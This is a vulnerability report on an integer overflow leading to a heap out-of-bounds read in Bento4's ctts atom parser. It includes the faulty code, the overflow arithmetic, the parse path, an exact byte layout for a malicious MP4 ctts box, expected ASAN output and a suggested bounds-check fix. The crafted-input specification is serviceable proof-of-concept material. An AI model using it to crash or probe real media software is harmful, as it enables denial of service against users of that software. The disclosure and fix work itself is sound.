# VULN 001 — AP4_CttsAtom Integer Overflow → Heap Out-of-Bounds Read

## Summary

A 32-bit integer multiplication overflow in `AP4_CttsAtom::AP4_CttsAtom()` allows an
attacker to trigger a heap buffer overflow (OOB read) by supplying a crafted MP4 file
with a `ctts` box whose `entry_count` field is large enough to cause the multiplication
`entry_count * 8` to wrap around to a small value in 32-bit arithmetic.

## Affected File

`Bento4/Source/C++/Core/Ap4CttsAtom.cpp`, lines 77–97

## Vulnerable Code

```cpp
AP4_UI32 entry_count;
stream.ReadUI32(entry_count);                          // line 78 — no upper-bound check
m_Entries.SetItemCount(entry_count);                   // line 79
unsigned char* buffer = new unsigned char[entry_count*8]; // line 80 — OVERFLOW HERE
AP4_Result result = stream.Read(buffer, entry_count*8);   // line 81
if (AP4_FAILED(result)) { delete[] buffer; return; }
for (unsigned i=0; i<entry_count; i++) {               // lines 88-96
    m_Entries[i].m_SampleCount  = AP4_BytesToUInt32BE(&buffer[i*8  ]); // OOB at i=1
    ...
    m_Entries[i].m_SampleOffset = AP4_BytesToUInt32BE(&buffer[i*8+4]);
}
delete[] buffer;
```

## Root Cause

`entry_count` is an `AP4_UI32` (32-bit unsigned integer). The expression `entry_count * 8`
is evaluated in 32-bit unsigned arithmetic. When `entry_count = 0x20000001`:

```
0x20000001 * 8 = 0x100000008  →  truncated to 0x00000008 = 8  (mod 2^32)
```

So `new unsigned char[8]` allocates only **8 bytes**, but the subsequent loop executes
`entry_count = 536,870,913` iterations, reading `buffer[i*8]` and `buffer[i*8+4]`.

At loop iteration `i=1`:
- `buffer[8]` is accessed → **heap-buffer-overflow** (8 bytes past the 8-byte buffer)
- ASAN reports the violation immediately and aborts the process.

## Trigger Path

```
mp42aac main()
  → new AP4_File(*input)
    → AP4_AtomFactory::CreateAtomFromStream()
      → AP4_CttsAtom::Create(size, stream)
        → new AP4_CttsAtom(size, version, flags, stream)
          → line 80: new unsigned char[entry_count*8]  ← OVERFLOW
          → line 88: buffer[i*8] OOB read              ← CRASH (ASAN)
```

## PoC Construction

The crafted MP4 contains a minimal but structurally plausible box hierarchy so that
the parser reaches the `ctts` box:

```
ftyp
moov
  mvhd
  trak
    tkhd
    mdia
      mdhd
      hdlr
      minf
        smhd
        dinf (dref/url)
        stbl
          stsd  (0 entries)
          stts  (0 entries)
          stsc  (0 entries)
          stsz  (sample_size=0, count=0)
          stco  (0 entries)
          ctts  ← MALICIOUS BOX
```

### ctts box layout (24 bytes total)

| Offset | Size | Value      | Description            |
|--------|------|------------|------------------------|
| 0      | 4    | 0x00000018 | box size = 24          |
| 4      | 4    | `ctts`     | box type               |
| 8      | 1    | 0x00       | version = 0            |
| 9      | 3    | 0x000000   | flags = 0              |
| 12     | 4    | 0x20000001 | entry_count (malicious)|
| 16     | 8    | 0x00…00    | dummy data (8 bytes)   |

The 8 bytes of dummy data ensure that `stream.Read(buffer, 8)` succeeds, allowing
execution to reach the vulnerable loop.

## Expected ASAN Output

```
=================================================================
==<pid>==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 4 at 0x... thread T0
    #0 AP4_BytesToUInt32BE ...
    #1 AP4_CttsAtom::AP4_CttsAtom (Ap4CttsAtom.cpp:89)
    ...
SUMMARY: AddressSanitizer: heap-buffer-overflow Ap4CttsAtom.cpp:89
```

## Files

| File                 | Purpose                              |
|----------------------|--------------------------------------|
| `vuln_001_gen.py`    | Generates `vuln_001.mp4`            |
| `vuln_001_run.sh`    | Runs the PoC and collects output    |
| `vuln_001.mp4`       | Crafted input (generated at runtime)|
| `vuln_001_result.txt`| Combined stdout/stderr/ASAN logs    |
| `vuln_001_status.txt`| Verdict: VERIFIED_CRASH / UNVERIFIED|

## Fix Suggestion

Add an upper-bound check on `entry_count` before the allocation:

```cpp
AP4_UI32 entry_count;
stream.ReadUI32(entry_count);
// Guard: refuse implausibly large counts (box cannot hold that many entries)
AP4_UI64 needed = (AP4_UI64)entry_count * 8;
if (needed > size) {  // size is the declared atom size
    return;
}
m_Entries.SetItemCount(entry_count);
unsigned char* buffer = new unsigned char[needed];
```
